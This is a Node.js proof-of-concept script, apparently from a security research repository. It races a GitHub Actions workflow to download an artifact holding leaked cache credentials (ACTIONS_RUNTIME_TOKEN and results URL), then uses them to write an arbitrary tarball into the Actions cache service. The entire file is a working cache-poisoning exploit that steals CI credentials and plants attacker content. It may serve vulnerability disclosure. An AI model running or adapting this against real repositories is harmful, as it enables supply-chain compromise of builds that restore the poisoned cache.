import {createHash} from 'node:crypto';
import {execFileSync} from 'node:child_process';
import {readFile, unlink, writeFile} from 'node:fs/promises';
import {tmpdir} from 'node:os';
import {join} from 'node:path';

const [runId, tarballPath] = process.argv.slice(2);
const apiToken = process.env.RACE_GITHUB_TOKEN;
if (!runId || !tarballPath || !apiToken) {
  throw new Error(
    'usage: RACE_GITHUB_TOKEN=... node race-last-step.mjs <run-id> <cache.tgz>',
  );
}

const owner = 'arnodorian1337';
const repo = 'pwnreq-artifact-zipslip-poc';
const artifactName = 'controlled-wireit-cache-credential';
const apiHeaders = {
  accept: 'application/vnd.github+json',
  authorization: `Bearer ${apiToken}`,
  'x-github-api-version': '2022-11-28',
};
const start = Date.now();
const elapsed = () => `${Date.now() - start}ms`;

let artifact;
while (!artifact && Date.now() - start < 60_000) {
  const response = await fetch(
    `https://api.github.com/repos/${owner}/${repo}/actions/runs/${runId}/artifacts`,
    {headers: apiHeaders},
  );
  if (!response.ok) {
    throw new Error(`artifact listing returned HTTP ${response.status}`);
  }
  const listing = await response.json();
  artifact = listing.artifacts.find(item => item.name === artifactName);
  if (!artifact) {
    await new Promise(resolve => setTimeout(resolve, 100));
  }
}
if (!artifact) {
  throw new Error('artifact did not become visible within 60 seconds');
}
console.log(`ARTIFACT_VISIBLE elapsed=${elapsed()} id=${artifact.id}`);

const archiveResponse = await fetch(artifact.archive_download_url, {
  headers: apiHeaders,
  redirect: 'follow',
});
if (!archiveResponse.ok) {
  throw new Error(`artifact download returned HTTP ${archiveResponse.status}`);
}
const zipPath = join(tmpdir(), `pwnreq-wireit-race-${runId}.zip`);
await writeFile(zipPath, Buffer.from(await archiveResponse.arrayBuffer()));
const credential = JSON.parse(
  execFileSync('unzip', ['-p', zipPath, 'wireit-cache-credential.json'], {
    encoding: 'utf8',
  }),
);
await unlink(zipPath);
console.log(`CREDENTIAL_DOWNLOADED elapsed=${elapsed()}`);

const baseUrl = credential.caching.github.ACTIONS_RESULTS_URL;
const runtimeToken = credential.caching.github.ACTIONS_RUNTIME_TOKEN;
const cacheService = path =>
  new URL(`twirp/github.actions.results.api.v1.CacheService/${path}`, baseUrl);
const authenticatedPost = async (path, body) => {
  const response = await fetch(cacheService(path), {
    method: 'POST',
    headers: {
      authorization: `Bearer ${runtimeToken}`,
      'content-type': 'application/json',
    },
    body: JSON.stringify(body),
  });
  const text = await response.text();
  console.log(`${path} status=${response.status} elapsed=${elapsed()}`);
  if (!response.ok) {
    console.log(`CACHE_SERVICE_MESSAGE=${text}`);
    return undefined;
  }
  return text ? JSON.parse(text) : {};
};

const key = `pwnreq-last-step-race-${runId}`;
const version = createHash('sha256').update(key).digest('hex');
const archive = await readFile(tarballPath);
const reservation = await authenticatedPost('CreateCacheEntry', {key, version});
if (!reservation) {
  process.exit(2);
}

const blockId = Buffer.from('0000').toString('base64');
const blockUrl = new URL(reservation.signed_upload_url);
blockUrl.searchParams.set('comp', 'block');
blockUrl.searchParams.set('blockid', blockId);
let response = await fetch(blockUrl, {
  method: 'PUT',
  headers: {
    'content-type': 'application/octet-stream',
    'x-ms-blob-type': 'BlockBlob',
  },
  body: archive,
});
console.log(`UploadBlock status=${response.status} elapsed=${elapsed()}`);
if (!response.ok) {
  process.exit(3);
}

const blockListUrl = new URL(reservation.signed_upload_url);
blockListUrl.searchParams.set('comp', 'blocklist');
response = await fetch(blockListUrl, {
  method: 'PUT',
  headers: {'content-type': 'text/plain; charset=UTF-8'},
  body: `<?xml version="1.0" encoding="utf-8"?>\n<BlockList>\n  <Uncommitted>${blockId}</Uncommitted>\n</BlockList>\n`,
});
console.log(`CommitBlockList status=${response.status} elapsed=${elapsed()}`);
if (!response.ok) {
  process.exit(4);
}

const finalized = await authenticatedPost('FinalizeCacheEntryUpload', {
  key,
  version,
  sizeBytes: archive.length,
});
if (!finalized) {
  process.exit(5);
}
console.log(`LAST_STEP_RACE_CACHE_WRITE=true key=${key}`);
